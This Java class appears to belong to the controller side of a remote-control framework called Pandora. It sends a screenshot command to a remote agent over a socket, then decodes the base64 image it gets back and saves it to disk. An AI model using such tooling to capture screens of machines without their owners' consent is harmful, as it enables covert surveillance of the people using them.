package org.pandora.master.scene.impl.agent;

import org.pandora.master.Master;
import org.pandora.master.data.agent.AgentData;
import org.pandora.master.utils.SocketUtils;
import org.pandora.master.utils.TimeUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Base64;
import java.util.concurrent.ConcurrentHashMap;

public class Screenshot {

    private final SocketUtils socketUtils;
    private final AgentData agentData;
    private final Master master;
    private final ConcurrentHashMap<String, Screenshot> screenshots;

    public Screenshot(final Master master, final SocketUtils socketUtils, final AgentData agentData) {
        this.agentData = agentData;
        this.socketUtils = socketUtils;
        this.master = master;
        this.screenshots = master.getStageManager().getScreenshots();
    }

    public void sendRequest() {
        final String requestId = TimeUtils.getRandomId();
        this.screenshots.put(requestId, this);
        this.socketUtils.write(this.agentData.getId(), "screenshot:" + requestId);
    }

    public void receiveRequest(final String requestId, final String data) {
        if (!this.screenshots.get(requestId).equals(this)) return;
        this.screenshots.remove(requestId);
        try {
            File folder = new File(this.master.getFileUtils().getValue("download"));
            if (!folder.exists()) folder.mkdirs();
            File file = new File(folder.getAbsolutePath() + "\\Screenshot-" + TimeUtils.getSimpleHour().replace(":", "-") + ".jpg");
            byte[] imageByteArray = Base64.getDecoder().decode(data);
            FileOutputStream imageOutFile = new FileOutputStream(file);
            imageOutFile.write(imageByteArray);
            imageOutFile.close();
            if (file.exists())
                this.master.getNotification().notify("Screenshot", "Saved at " + file.getAbsolutePath());
        } catch (final IOException ioException) {
            ioException.printStackTrace();
        }
    }
}
